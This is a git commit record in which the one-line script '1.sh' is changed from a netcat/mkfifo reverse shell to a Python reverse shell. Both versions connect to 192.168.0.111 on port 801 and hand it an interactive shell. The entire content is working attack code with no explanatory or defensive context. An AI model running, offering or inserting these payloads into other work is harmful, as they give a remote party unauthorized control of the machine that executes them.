b892dc82065c726efaf8ecdb164d4a5aca206bba
greg-wu <greg-wu@users.noreply.github.com>
2019-08-29 21:18:09 +0800

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,1 +1,1 @@
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.111 801 >/tmp/f
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.111",801));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
